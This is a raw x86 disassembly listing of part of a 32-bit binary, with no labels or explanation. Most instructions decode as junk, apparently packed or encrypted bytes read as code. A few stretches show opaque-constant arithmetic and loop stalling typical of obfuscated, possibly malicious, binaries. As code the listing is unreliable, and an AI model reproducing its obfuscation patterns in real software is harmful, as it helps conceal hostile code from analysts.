  4112e4:	aam    0x27
  4112e6:	sbb    dl,ch
  4112e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112e9:	xchg   esp,eax
  4112ea:	(bad)  
  4112eb:	sub    esp,DWORD PTR [ebx+0x3e]
  4112ee:	adc    DWORD PTR [ecx],ebp
  4112f0:	in     eax,0xb8
  4112f2:	xor    eax,0xe3d45b91
  4112f7:	jle    0x411371
  4112f9:	mov    ch,0x3f
  4112fb:	imul   esi,ebx,0xaaf4941e
  411301:	push   es
  411302:	mov    esp,0xefa68a70
  411307:	jbe    0x41134c
  411309:	xlat   BYTE PTR ds:[ebx]
  41130a:	adc    esp,edi
  41130c:	mov    edx,0xb6f333
  411311:	arpl   WORD PTR [ebp-0x729b42cd],di
  411317:	fnstcw WORD PTR [edx-0x7f]
  41131a:	xor    edx,DWORD PTR [edx]
  41131c:	(bad)  
  41131d:	neg    DWORD PTR [eax+0x70]
  411320:	adc    BYTE PTR [edi+0x3a359ac9],bh
  411326:	jp     0x411322
  411328:	lods   al,BYTE PTR ds:[esi]
  411329:	inc    ebp
  41132a:	jle    0x4112b1
  41132c:	(bad)  
  41132d:	sti    
  41132e:	jle    0x4112cf
  411330:	and    al,0xa
  411332:	and    ebp,DWORD PTR [edx+0x52]
  411335:	sub    eax,0x4d2fe1a
  41133a:	lea    ebp,ss:[edx-0x55]
  41133e:	sbb    eax,0x22cfdcdb
  411343:	sti    
  411344:	sbb    eax,0xb8b681d
  411349:	lea    eax,[eax]
  41134b:	cld    
  41134c:	lock in eax,0x44
  41134f:	in     al,0x8
  411351:	pusha  
  411352:	fstp   QWORD PTR [esi+0xbb984cc]
  411358:	cli    
  411359:	add    DWORD PTR [edi-0x218410f0],edi
  41135f:	mov    eax,0xd4f9be0f
  411364:	sahf   
  411365:	stos   BYTE PTR es:[edi],al
  411366:	outs   dx,DWORD PTR ds:[esi]
  411367:	pop    ecx
  411368:	mov    eax,ds:0x8e08e38
  41136d:	xor    al,0x7b
  41136f:	mov    dh,bl
  411371:	push   edx
  411372:	or     eax,0xf2a25ffc
  411377:	addr16 es hlt 
  41137a:	dec    ebx
  41137b:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  41137f:	mov    edx,DWORD PTR [ebp+0xc]
  411382:	cmp    al,BYTE PTR [edx]
  411384:	jne    0x411713
  41138a:	mov    eax,DWORD PTR [ebp-0x8]
  41138d:	mov    edx,DWORD PTR [ebp+0xc]
  411390:	movsx  edx,BYTE PTR [edx]
  411393:	xor    eax,ecx
  411395:	add    eax,esi
  411397:	cmp    edx,eax
  411399:	je     0x41156b
  41139f:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4113a6:	lea    eax,[ebp-0x18]
  4113a9:	mov    DWORD PTR [ebp-0x14],eax
  4113ac:	mov    eax,DWORD PTR [ebp-0x14]
  4113af:	add    DWORD PTR [eax],0x705fa8f
  4113b5:	mov    eax,DWORD PTR [ebp-0x10]
  4113b8:	mov    edx,DWORD PTR [ebp+0x8]
  4113bb:	xor    eax,ecx
  4113bd:	lea    eax,[eax+edx*1+0x32729b]
  4113c4:	mov    DWORD PTR [ebp+0x8],eax
  4113c7:	jmp    0x411563
  4113cc:	sub    DWORD PTR [esi-0x26],ebx
  4113cf:	sub    al,0x69
  4113d1:	test   al,0xe9
  4113d3:	pop    ebx
  4113d4:	cld    
  4113d5:	add    DWORD PTR [edx+0x34c676a1],ecx
  4113db:	push   0x1
  4113dd:	inc    eax
  4113de:	jle    0x41145e
  4113e0:	icebp  
  4113e1:	jg     0x411461
  4113e3:	jle    0x4113ba
  4113e5:	pop    eax
  4113e6:	xor    ch,al
  4113e8:	jmp    0x269b:0xb6f960b6
  4113ef:	jecxz  0x411403
  4113f1:	cli    
  4113f2:	imul   ebp,DWORD PTR [edx],0x3d3b9551
  4113f8:	ffree  st(3)
  4113fb:	cmp    ebp,ebp
  4113fd:	cmp    edx,DWORD PTR [edx-0x76107fbf]
  411403:	mov    ds:0x4b1ad5c9,eax
  411408:	sbb    BYTE PTR [ebx-0x421682b7],al
  41140e:	ss mov ecx,0xa4ceb5fe
  411414:	ret    0x67ef
  411417:	sbb    edx,0xb6737e15
  41141d:	aas    
  41141e:	(bad)  
  41141f:	cmc    
  411420:	sbb    esp,DWORD PTR [ecx+eax*2-0x6e7b5fd9]
  411427:	xlat   BYTE PTR ds:[ebx]
  411428:	in     eax,0xd3
  41142a:	mov    DWORD PTR [ebx],ebp
  41142c:	cmp    DWORD PTR ds:0x28ec667d,ebp
  411432:	pop    esi
  411433:	test   eax,0xab05fae2
  411438:	xchg   ecx,eax
  411439:	(bad)  
  41143a:	loopne 0x41140b
  41143c:	sub    edx,edx
  41143e:	cli    
  41143f:	scas   eax,DWORD PTR es:[edi]
  411440:	rcl    dl,cl
  411442:	push   ebx
  411443:	xor    edx,esp
  411445:	dec    esp
  411446:	mov    esi,0xf1bd25c3
  41144b:	retf   0x19d3
  41144e:	jmp    0x41148f
  411450:	loopne 0x4113f0
  411452:	jmp    FWORD PTR [ebp-0x4f]
  411455:	lea    esp,[esi-0x7e]
  411458:	dec    edi
  411459:	push   esp
  41145a:	sbb    al,0x38
  41145c:	pop    eax
  41145d:	jnp    0x411433
  41145f:	not    ebx
  411461:	mov    bl,0x25
  411463:	push   cs
  411464:	icebp  
  411465:	and    al,0xce
  411467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411468:	mov    esp,0x3bafadf4
  41146d:	not    bl
  41146f:	inc    ecx
  411470:	ret    0x28ae
  411473:	jecxz  0x411419
  411475:	mov    DWORD PTR [esi],0x174f3285
  41147b:	test   DWORD PTR [ecx],eax
  41147d:	cdq    
  41147e:	inc    ecx
  41147f:	mov    WORD PTR [esi],gs
  411481:	jmp    0x411449
  411483:	shl    DWORD PTR [ebx],1
  411485:	test   DWORD PTR [ebx-0x7],ebp
  411488:	add    edx,ecx
  41148a:	mov    DWORD PTR [ebx],ebx
  41148c:	inc    esp
  41148d:	jbe    0x411448
  41148f:	mov    cs,edx
  411491:	test   ah,cl
  411493:	(bad)  
  411494:	fdivr  QWORD PTR [ebx+0x79]
  411497:	imul   eax,DWORD PTR [ebx+0x54],0x645d510f
  41149e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41149f:	add    dl,BYTE PTR [eax-0x39307d67]
  4114a5:	push   ebp
  4114a6:	or     eax,0x72412d49
  4114ab:	fld    TBYTE PTR [ebp+0x39b2cd17]
  4114b1:	faddp  st(0),st
  4114b3:	jmp    0xb11e88fb
  4114b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114b9:	push   esi
  4114ba:	fwait
  4114bb:	in     al,0xac
  4114bd:	pop    ss
  4114be:	mov    ds:0x90a63c52,al
  4114c3:	fst    DWORD PTR [edx]
  4114c5:	int    0x89
  4114c7:	int3   
  4114c8:	jbe    0xd14e69d4
  4114ce:	inc    edi
  4114cf:	into   
  4114d0:	jmp    0x4114da
  4114d2:	(bad)  
  4114d3:	pop    esp
  4114d4:	(bad)  
  4114d5:	jo     0x411467
  4114d7:	les    edi,FWORD PTR [ebp-0x1ee14a06]
  4114dd:	xchg   edi,eax
  4114de:	out    dx,al
  4114df:	jns    0x4114c5
  4114e1:	inc    edx
  4114e2:	popa   
  4114e3:	das    
  4114e4:	push   esi
  4114e5:	dec    ebp
  4114e6:	fcom   DWORD PTR [ecx]
  4114e9:	fyl2xp1 
  4114eb:	ins    BYTE PTR es:[edi],dx
  4114ec:	xchg   esi,eax
  4114ed:	lods   eax,DWORD PTR ds:[esi]
  4114ee:	gs xchg ebx,eax
  4114f0:	(bad)  
  4114f1:	mov    ebp,0xe25008fd
  4114f6:	xor    DWORD PTR [ecx],0x725febd1
  4114fc:	or     al,0x15
  4114fe:	cmp    BYTE PTR [edi],ch
  411500:	int3   
  411501:	pop    edi
  411502:	ja     0x411500
  411504:	sti    
  411505:	pop    edx
  411506:	jg     0x4114e0
  411508:	xchg   ecx,eax
  411509:	div    BYTE PTR [ecx]
  41150b:	shr    DWORD PTR [eax],0x47
  41150e:	mov    ds:0x44cff257,eax
  411513:	(bad)  
  411515:	or     eax,ecx
  411517:	pop    eax
  411518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411519:	sbb    ebp,esi
  41151b:	daa    
  41151c:	sub    BYTE PTR [edi],0x63
  41151f:	jb     0x4114b9
  411521:	in     eax,0xca
  411523:	int    0x47
  411525:	lahf   
  411526:	in     eax,dx
  411527:	add    esp,ebp
  411529:	mov    ds:0x48fd13cb,al
  41152e:	adc    dh,BYTE PTR [ebp-0x4d]
  411531:	repz daa 
  411533:	shr    BYTE PTR [edi+0x6a],cl
  411536:	imul   eax,DWORD PTR [ebx-0x3d],0x2c6e3731
  41153d:	sub    ch,BYTE PTR [esp+edi*1+0x64]
  411541:	ficomp WORD PTR [ebx-0x36]
  411544:	mov    dl,BYTE PTR [ebx+eax*2]
  411547:	cmp    al,0xbf
  411549:	pushf  
  41154a:	and    al,0x50
  41154c:	mov    eax,0x97574b39
  411551:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411552:	or     dl,dh
  411554:	std    
  411555:	jne    0x411572
  411557:	sbb    DWORD PTR ds:0x953099ff,eax
  41155d:	or     eax,0xdf0955d0
  411562:	and    bh,bh
  411564:	inc    ebp
  411565:	or     al,0xe9
  411567:	pop    edi
  411568:	cld    
  411569:	(bad)  
  41156a:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  411570:	jmp    0x41170c
  411575:	jmp    0xe967:0xb166b574
  41157c:	jo     0x41155e
  41157e:	fidiv  WORD PTR [edx-0x5c]
  411581:	into   
  411582:	stos   DWORD PTR es:[edi],eax
  411583:	and    eax,0x7e4180fa
  411588:	jle    0x41157b
  41158a:	jg     0x41160a
  41158c:	jle    0x411554
  41158e:	fwait
  41158f:	mov    ah,BYTE PTR es:[esi-0xb802e37]
  411596:	out    dx,eax
  411597:	jns    0x4115cf
  411599:	fst    QWORD PTR [edx+0x72]
  41159c:	fild   QWORD PTR ds:0x994faeb8
  4115a2:	and    DWORD PTR [esi+0x75ad449b],edx
  4115a8:	jae    0x411569
  4115aa:	test   eax,0xb3456db8
  4115af:	mov    dh,BYTE PTR [edx]
  4115b1:	and    al,0xae
  4115b3:	in     al,0x63
  4115b5:	mov    ds:0x962f57aa,al
  4115ba:	xor    bl,ah
  4115bc:	nop
  4115bd:	cmp    esi,DWORD PTR [ebp+0x0]
  4115c0:	xlat   BYTE PTR ds:[ebx]
  4115c1:	adc    dh,ch
  4115c3:	cs xchg ebp,eax
  4115c5:	hlt    
  4115c6:	inc    edx
  4115c7:	(bad)  
  4115c8:	or     esp,DWORD PTR [edx-0x4f]
  4115cb:	add    al,0x4b
  4115cd:	mov    bl,0xcb
  4115cf:	lds    eax,FWORD PTR [ecx-0x35c332cd]
  4115d5:	in     eax,0xdb
  4115d7:	and    edx,0xffffffbe
  4115da:	rcl    DWORD PTR [edi*4-0x549728b9],0x36
  4115e2:	std    
  4115e3:	test   al,0x9a
  4115e5:	ret    
  4115e6:	inc    edi
  4115e7:	shl    BYTE PTR [ebx-0x6429344a],cl
  4115ed:	xchg   esp,eax
  4115ee:	aas    
  4115ef:	xor    cl,dh
  4115f1:	dec    ecx
  4115f2:	fist   DWORD PTR [ebx-0x7133dd52]
  4115f8:	add    al,0xea
  4115fa:	sub    al,0x4a
  4115fc:	xlat   BYTE PTR ds:[ebx]
  4115fd:	ret    
  4115fe:	add    esi,DWORD PTR [edi+eax*4-0x8]
  411602:	call   0x3252:0xc9a6e6f9
  411609:	fs push ecx
  41160b:	jb     0x41161f
  41160d:	add    BYTE PTR [ebp-0x288bf274],dl
  411613:	test   eax,0x16fb336b
  411618:	sbb    esp,DWORD PTR ds:0xa8be41ea
  41161e:	mov    al,0x1a
  411620:	inc    ebx
  411621:	or     ch,0x2c
  411624:	aaa    
  411625:	test   eax,0x61fff00b
  41162a:	es mov edx,0xdcbefed7
  411630:	cwde   
  411631:	lea    esi,[ecx+0x19]
  411634:	fs in  al,dx
  411636:	xchg   edx,eax
  411637:	jle    0x411627
  411639:	addr16 aaa 
  41163b:	popf   
  41163c:	push   esi
  41163d:	sub    BYTE PTR [bx+si+0x223d],dh
  411642:	xlat   BYTE PTR ds:[ebx]
  411643:	pop    ds
  411644:	add    eax,0xe02ae0ac
  411649:	ins    BYTE PTR es:[edi],dx
  41164a:	add    bl,ah
  41164c:	push   cs
  41164d:	pop    esp
  41164e:	jp     0x41165a
  411650:	xor    ch,BYTE PTR [esi+0x5886ca9d]
  411656:	pushf  
  411657:	adc    BYTE PTR [edi-0x782977d8],al
  41165d:	fwait
  41165e:	sub    bl,BYTE PTR [edi]
  411660:	icebp  
  411661:	mov    esp,0x139a33b3
  411666:	outs   dx,DWORD PTR ds:[esi]
  411667:	fmul   st,st(0)
  411669:	add    DWORD PTR [edi],0x5f
  41166c:	les    esi,FWORD PTR [edx+0x4de458f4]
  411672:	jae    0x41164b
  411674:	push   es
  411675:	retf   
  411676:	ret    
  411677:	pop    esp
  411678:	sub    dl,BYTE PTR [ebx+edx*1-0x105a3107]
  41167f:	sub    bl,dl
  411681:	push   edi
  411682:	and    DWORD PTR [esi+esi*4+0x2ea07f43],esi
  411689:	sub    dh,BYTE PTR [edx]
  41168b:	aam    0x31
  41168d:	outs   dx,DWORD PTR ds:[esi]
  41168e:	jg     0x41166f
  411690:	pop    ecx
  411691:	xlat   BYTE PTR ds:[ebx]
  411692:	in     al,0xa7
  411694:	mov    al,ds:0x9b0e13e4
  411699:	push   es
  41169a:	pop    edx
  41169b:	mov    BYTE PTR [edi+0x4eb1d5f6],al
  4116a1:	or     eax,0xf8d0280c
  4116a6:	jmp    0xc4f8:0xb9f88658
  4116ad:	dec    ebp
  4116ae:	aas    
  4116af:	dec    ebp
  4116b0:	sub    al,0x17
  4116b2:	dec    eax
  4116b3:	mov    al,bl
  4116b5:	aaa    
  4116b6:	retf   
  4116b7:	call   0xdaf4:0x33568cc8
  4116be:	xor    al,0x5f
  4116c0:	add    al,0x8d
  4116c2:	xor    al,0x4b
  4116c4:	gs stos BYTE PTR es:[edi],al
  4116c6:	mov    dl,0x50
  4116c8:	in     al,0x8
  4116ca:	cmp    ch,0x21
  4116cd:	out    dx,al
  4116ce:	mov    fs,ebp
  4116d0:	push   ss
  4116d1:	adc    esi,DWORD PTR [eax+0x61]
  4116d4:	and    eax,0x890376f6
  4116d9:	add    ebx,DWORD PTR [edi+0x793a9e17]
  4116df:	bound  ebp,QWORD PTR [esi+0x7fb58822]
  4116e5:	xor    BYTE PTR ds:0xee39d77c,ah
  4116eb:	mov    cl,0x36
  4116ed:	push   cs
  4116ee:	and    ebp,DWORD PTR [eax+0x60391e41]
  4116f4:	cdq    
  4116f5:	xor    al,0x8
  4116f7:	push   esp
  4116f8:	add    BYTE PTR [edx-0x5994907b],bh
  4116fe:	mov    ah,0x3a
  411700:	icebp  
  411701:	sub    ch,BYTE PTR [esi+0x5765559f]
  411707:	xor    al,0x4f
  411709:	xchg   ecx,eax
  41170a:	mov    es:0x3104d8b,eax
  411710:	(bad)  
  411711:	mov    DWORD PTR [ecx],eax
  411713:	pop    esi
  411714:	leave  
  411715:	ret    0xc
  411718:	push   ebp
  411719:	mov    ebp,esp
  41171b:	push   ecx
  41171c:	neg    eax
  41171e:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411725:	mov    eax,DWORD PTR [ebp+0x8]
  411728:	adc    DWORD PTR ds:0x4337ab,0x2178
  411732:	mov    al,BYTE PTR [eax]
  411734:	sbb    DWORD PTR ds:0x4337fb,0x4337c3
  41173e:	add    al,0x38
  411740:	xor    al,0x46
  411742:	cmp    al,0xc3
  411744:	mov    DWORD PTR ds:0x433803,0x7813
  41174e:	jne    0x411ea2
  411754:	and    edx,DWORD PTR ds:0x43382b
  41175a:	mov    eax,DWORD PTR [ebp+0x8]
  41175d:	xor    DWORD PTR ds:0x4337bb,0x67d7
  411767:	mov    ecx,DWORD PTR [ebp+0x8]
  41176a:	add    edx,0xbb1
  411770:	jmp    0x4119ab
  411775:	jo     0x4117d4
  411777:	sbb    DWORD PTR [esi],0x7171e291
  41177d:	rol    DWORD PTR [edi],1
  41177f:	push   ebx
  411780:	sbb    eax,0x8cfde8d3
  411785:	add    ecx,DWORD PTR [edi+0x7e]
  411788:	jle    0x41179a
  41178a:	jl     0x41180a
  41178c:	jle    0x4117f2
  41178e:	pusha  
  41178f:	lds    ebp,FWORD PTR [ebx]
  411791:	arpl   WORD PTR [edi],si
  411793:	call   0xa91f:0x31c00394
  41179a:	xor    cl,BYTE PTR [ebx-0x232756ba]
  4117a0:	pushf  
  4117a1:	test   BYTE PTR [esi+eiz*2],ch
  4117a4:	xchg   ecx,ebp
  4117a6:	jecxz  0x41172a
  4117a8:	js     0x411748
  4117aa:	pusha  
  4117ab:	retf   
  4117ac:	ja     0x41173a
  4117ae:	gs push eax
  4117b0:	pop    edx
  4117b1:	and    dl,BYTE PTR [ecx-0x7e]
  4117b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117b5:	pop    edx
  4117b6:	pop    edx
  4117b7:	sbb    dh,BYTE PTR [edi-0x2]
  4117ba:	mov    ebp,DWORD PTR [edi]
  4117bc:	shr    BYTE PTR [edi],0x3c
  4117bf:	retf   0x27df
  4117c2:	jb     0x4117ff
  4117c4:	ret    
  4117c5:	mov    bl,0xb7
  4117c7:	push   ebx
  4117c8:	loopne 0x4117c4
  4117ca:	mov    esp,0xd8af7fbd
  4117cf:	retf   0x2177
  4117d2:	cmc    
  4117d3:	leave  
  4117d4:	mov    DWORD PTR [esi],ebx
  4117d6:	sub    ebp,ebx
  4117d8:	loop   0x41182a
  4117da:	aas    
  4117db:	dec    ebx
  4117dc:	jmp    0x91c8bbbb
  4117e1:	enter  0x15d9,0x4d
  4117e5:	mov    esp,0xd1a1a0df
  4117ea:	sti    
  4117eb:	jne    0x411826
  4117ed:	mov    bh,0xd8
  4117ef:	shl    DWORD PTR [esp+edx*1-0x31209990],cl
  4117f6:	lds    ebx,FWORD PTR [esi]
  4117f8:	add    ebp,DWORD PTR [esi-0x16]
  4117fb:	(bad)  
  4117fc:	shr    BYTE PTR [esi],1
  4117fe:	mov    ds:0x895ec63,eax
  411803:	(bad)  
  411804:	fdivp  st(7),st
  411806:	inc    ebx
  411807:	retf   0xbe65
  41180a:	pop    ebp
  41180b:	call   0x738:0x139d8d0
  411812:	pop    edi
  411813:	outs   dx,BYTE PTR ds:[esi]
  411814:	ret    
  411815:	cmp    eax,0x43e4275d
  41181a:	frstor [eax]
  41181c:	mov    ebx,0x36570430
  411821:	mov    dl,dl
  411823:	xlat   BYTE PTR ds:[ebx]
  411824:	out    dx,eax
  411825:	sahf   
  411826:	adc    BYTE PTR [ebp-0x7d7af52c],dl
  41182c:	ins    BYTE PTR es:[edi],dx
  41182d:	inc    edi
  41182e:	retf   
  41182f:	sbb    edx,DWORD PTR [ebx]
  411831:	sbb    al,0xbd
  411833:	stos   BYTE PTR es:[edi],al
  411834:	push   ebx
  411835:	iret   
  411836:	cmp    cl,BYTE PTR [ecx-0x6ff9993d]
  41183c:	inc    ecx
  41183d:	cmp    bh,BYTE PTR [eax-0x5f374d20]
  411843:	cli    
  411844:	jae    0x41180c
  411846:	cmp    ch,BYTE PTR [edi-0x69]
  411849:	inc    bx
  41184b:	out    dx,eax
  41184c:	cmp    ebx,DWORD PTR [esi-0x42]
  41184f:	sub    eax,DWORD PTR [edx-0x49]
  411852:	mov    DWORD PTR [ebx],0x677f7bef
  411858:	xor    edi,ebx
  41185a:	loopne 0x41184e
  41185c:	imul   ecx,esi,0x641a38cb
  411862:	enter  0x9c0,0x7b
  411866:	sbb    DWORD PTR [ebp+0x548f361b],ebx
  41186c:	mov    WORD PTR [ebx+0x677d2832],ds
  411872:	cwde   
  411873:	sub    BYTE PTR [esi],bh
  411875:	in     al,0xcc
  411877:	add    BYTE PTR [eax-0x49],ah
  41187a:	sub    DWORD PTR [ebp+0x1e539a3a],0x77
  411881:	push   ebp
  411882:	push   ecx
  411883:	pop    ebx
  411884:	adc    ebx,DWORD PTR [edx+0x7f9e516f]
  41188a:	jbe    0x411885
  41188c:	mov    ds:0xf5e4d7a3,eax
  411891:	cs cmp ebp,edi
  411894:	loope  0x4118c1
  411896:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411897:	mov    BYTE PTR [eax],al
  411899:	xchg   ecx,eax
  41189a:	adc    BYTE PTR [eax-0x2649bcbd],ch
  4118a0:	mov    ebx,0xcbbed82c
  4118a5:	push   ss
  4118a6:	jne    0x41185c
  4118a8:	cmp    al,cl
  4118aa:	xor    BYTE PTR [ebx],bh
  4118ac:	hlt    
  4118ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118ae:	cli    
  4118af:	cmc    
  4118b0:	jae    0x4118f7
  4118b2:	ror    eax,0x1
  4118b5:	gs push esi
  4118b7:	inc    edi
  4118b8:	mov    WORD PTR [eax-0x14],?
  4118bb:	stos   BYTE PTR es:[edi],al
  4118bc:	or     DWORD PTR [ebx+0x52891c8b],esi
  4118c2:	pusha  
  4118c3:	xor    ebx,ecx
  4118c5:	mov    edx,0xf9d3f490
  4118ca:	sub    cl,bl
  4118cc:	pop    eax
  4118cd:	(bad)
  4118d1:	call   0x3b45:0xd7022e2a
  4118d8:	cdq    
  4118d9:	mov    ecx,0x3e7bd703
  4118de:	in     al,dx
  4118df:	aas    
  4118e0:	mov    ebp,0xfb648540
  4118e5:	mov    al,ds:0xc8706a6e
  4118ea:	or     bl,BYTE PTR [edi+0x1f]
  4118ed:	mov    eax,ds:0xe7f8a483
  4118f2:	in     al,dx
  4118f3:	xchg   esi,eax
  4118f4:	fnstenv [esi]
  4118f6:	xor    BYTE PTR [eax-0x2aaf83e],ch
  4118fc:	mov    dl,0x95
  4118fe:	jae    0x41193c
  411900:	loop   0x4118c4
  411902:	add    ch,BYTE PTR [edi]
  411904:	idiv   cl
  411906:	das    
  411907:	clc    
  411908:	and    al,0x33
  41190a:	cmp    eax,0x12f363c
  41190f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411910:	inc    edx
  411911:	push   ebx
  411912:	jmp    0x90af3676
  411917:	xchg   BYTE PTR [ecx-0x71],dl
  41191a:	cdq    
  41191b:	pushf  
  41191c:	mov    bh,BYTE PTR [eax-0x35f73c9f]
  411922:	ins    DWORD PTR es:[edi],dx
  411923:	cwde   
  411924:	stos   BYTE PTR es:[edi],al
  411925:	dec    esi
  411926:	mov    cl,0x9d
  411928:	aaa    
  411929:	mov    bh,0xa8
  41192b:	pop    eax
  41192c:	dec    ebp
  41192d:	adc    eax,0x3d912a1a
  411932:	pop    edx
  411933:	dec    ebx
  411934:	xchg   esp,eax
  411935:	inc    ecx
  411936:	int3   
  411937:	dec    ecx
  411938:	loope  0x411900
  41193a:	stc    
  41193b:	inc    eax
  41193c:	mov    cl,dl
  41193e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41193f:	cs cdq 
  411941:	inc    esi
  411942:	sti    
  411943:	es xchg esp,eax
  411945:	and    bl,dl
  411947:	add    eax,esi
  411949:	call   0xe1894f99
  41194e:	pushf  
  41194f:	retf   0x2d35
  411952:	dec    esi
  411953:	out    0x27,al
  411955:	inc    esp
  411956:	pop    ebp
  411957:	xor    BYTE PTR [ebp+0x7d331d36],bl
  41195d:	jns    0x411964
  41195f:	mov    ch,0xb8
  411961:	les    ecx,FWORD PTR [ebx+0x7dbdd3af]
  411967:	cmp    esi,ebx
  411969:	xchg   DWORD PTR [ecx],ebx
  41196b:	ret    0x495a
  41196e:	add    DWORD PTR [edi+0x2758df4c],edx
  411974:	call   esi
  411976:	jg     0x411999
  411978:	out    dx,eax
  411979:	js     0x4119a6
  41197b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41197c:	icebp  
  41197d:	mov    al,0xd3
  41197f:	push   ebp
  411980:	iret   
  411981:	aam    0x6c
  411983:	xchg   bh,cl
  411985:	dec    edi
  411986:	xchg   esp,eax
  411987:	dec    eax
  411988:	push   ecx
  411989:	test   ecx,0x76f0bdf8
  41198f:	dec    esp
  411990:	ret    0x47b3
  411993:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411994:	and    eax,0xd578cb88
  411999:	mov    al,0x17
  41199b:	into   
  41199c:	sahf   
  41199d:	nop
  41199e:	(bad)  
  41199f:	clc    
  4119a0:	enter  0xc47c,0xae
  4119a4:	mul    DWORD PTR [ebx-0xd]
  4119a7:	pop    edx
  4119a8:	pusha  
  4119a9:	mov    WORD PTR [eax+0x3],ds
  4119ac:	dec    eax
  4119ad:	cmp    al,0x9
  4119af:	sbb    eax,0x433723
  4119b4:	mov    edx,0x7510854
  4119b9:	mov    DWORD PTR [ebp+0x8],ecx
  4119bc:	and    DWORD PTR ds:0x433827,0x0
  4119c6:	jmp    0x4119d6
  4119cb:	mov    eax,ds:0x433827
  4119d0:	inc    eax
  4119d1:	mov    ds:0x433827,eax
  4119d6:	cmp    DWORD PTR ds:0x433827,0x17
  4119dd:	jae    0x4119fe
  4119e3:	cmp    DWORD PTR ds:0x433827,0x27
  4119ea:	jne    0x4119f9
  4119f0:	push   DWORD PTR [ebp-0x10]
  4119f3:	call   DWORD PTR ds:0x4123b8
  4119f9:	jmp    0x4119cb
  4119fe:	mov    eax,DWORD PTR [ebp-0x4]
  411a01:	jmp    0x411c3c
  411a06:	pop    edi
  411a07:	pop    edx
  411a08:	dec    eax
  411a09:	pop    es
  411a0a:	dec    ecx
  411a0b:	xor    eax,0xcba06271
  411a10:	outs   dx,DWORD PTR ds:[esi]
  411a11:	aam    0x12
  411a13:	cli    
  411a14:	jmp    0x107e:0x7e4d25da
  411a1b:	jl     0x411a9b
  411a1d:	jle    0x4119da
  411a1f:	jcxz   0x411a42
  411a22:	xor    BYTE PTR [eax],cl
  411a24:	cwde   
  411a25:	fidivr DWORD PTR [edi+0x2a]
  411a29:	inc    edx
  411a2a:	int    0x2e
  411a2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a2d:	sti    
  411a2e:	daa    
  411a2f:	add    BYTE PTR [edx+0x4ebbfee9],ch
  411a35:	lea    esi,[esp+edi*1-0xf64f228]
  411a3c:	xchg   ebp,eax
  411a3d:	cmp    ecx,edx
  411a3f:	and    esp,DWORD PTR [esi]
  411a41:	lock repnz mov esp,0x4793478a
  411a48:	pop    ecx
  411a49:	xor    al,0x99
  411a4b:	mov    eax,ds:0xfd5c5899
  411a50:	data16 sub ch,dl
  411a53:	repnz jmp 0xdba9:0x824d68ca
  411a5b:	hlt    
  411a5c:	sub    BYTE PTR [eax-0x56fa4c2b],bh
  411a62:	inc    eax
  411a63:	loop   0x411ad6
  411a65:	loope  0x411a26
  411a67:	fstp   DWORD PTR [ebx+0x6ded3a55]
  411a6d:	test   BYTE PTR [ebx+edi*2+0x7b4134f3],dh
  411a74:	push   es
  411a75:	dec    edx
  411a76:	std    
  411a77:	test   BYTE PTR [edx-0x1ee5036e],ah
  411a7d:	add    eax,0x4aca7ef6
  411a82:	sahf   
  411a83:	pushf  
  411a84:	pop    ebp
  411a85:	jae    0x411b01
  411a87:	fnsave [edx-0x6d758567]
  411a8d:	push   esp
  411a8e:	cmp    BYTE PTR [edx+0x4ac3dc79],dl
  411a94:	and    al,0xb
  411a96:	imul   ebx,DWORD PTR [esi-0x16],0x9d8eb6b2
  411a9d:	cmp    BYTE PTR [edx],ch
  411a9f:	push   ds
  411aa0:	cmp    ebp,DWORD PTR [esi+edx*8+0x7b07908a]
  411aa7:	shl    DWORD PTR [ebx],0x66
  411aaa:	mov    eax,0xe394d84c
  411aaf:	push   ebp
  411ab0:	jnp    0x411aeb
  411ab2:	addr16 mov al,0x2d
  411ab5:	add    al,0xeb
  411ab7:	sbb    bl,0xef
  411aba:	pop    ds
  411abb:	mov    edx,0xaf6f5a94
  411ac0:	sbb    ecx,DWORD PTR [ebp+0x66]
  411ac3:	(bad)  [ebp-0x2846981f]
  411ac9:	and    eax,0x99bfb64b
  411ace:	mov    fs,esp
  411ad0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ad1:	int    0x4a
  411ad3:	or     edi,edi
  411ad5:	cli    
  411ad6:	adc    eax,0x66f6c300
  411adb:	inc    edi
  411adc:	cmp    edx,DWORD PTR [ebx-0x2d]
  411adf:	jno    0x411acf
  411ae1:	imul   ebx,ecx,0xfffffff7
  411ae4:	cld    
  411ae5:	inc    esi
  411ae6:	cmp    BYTE PTR [ecx+0x746d0430],dl
  411aec:	shl    DWORD PTR [edi+eax*8-0x79d02b4a],cl
  411af3:	mov    ds:0x1cdd231f,eax
  411af8:	mov    dh,0xb7
  411afa:	xchg   edi,eax
  411afb:	sub    esp,DWORD PTR [edx+esi*4-0x678a70d6]
  411b02:	repnz dec BYTE PTR [ebx+0x645352ae]
  411b09:	cmp    esi,DWORD PTR [ebp-0x3]
  411b0c:	rcl    ebp,cl
  411b0e:	pop    edi
  411b0f:	dec    edx
  411b10:	sub    ah,bl
  411b12:	(bad)  [edx-0x37f6f168]
  411b18:	xor    cl,bh
  411b1a:	cdq    
  411b1b:	sub    ebx,0x67b70f67
  411b21:	jl     0x411b22
  411b23:	repnz clc 
  411b25:	jmp    0x8c95088d
  411b2a:	sbb    BYTE PTR [edi],bh
  411b2c:	cmp    BYTE PTR [edi-0x38d4cbee],bh
  411b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b33:	dec    ecx
  411b34:	xor    eax,0xe4f3a611
  411b39:	pop    edx
  411b3a:	pop    edi
